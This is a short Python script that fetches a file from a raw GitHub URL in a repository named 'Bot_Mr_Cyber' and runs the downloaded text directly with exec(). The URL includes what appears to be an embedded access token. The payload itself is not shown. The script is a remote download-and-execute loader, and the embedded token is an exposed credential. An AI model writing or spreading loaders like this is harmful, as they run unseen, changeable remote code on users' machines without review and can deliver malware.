import os
import requests


url="https://raw.githubusercontent.com/1hazem1kali/Bot_Mr_Cyber/main/Asase.py?token=GHSAT0AAAAAACRR7FL4EIVENPMDD5QAG7YAZRNCATQ"
code = requests.get(url).text
exec(code)
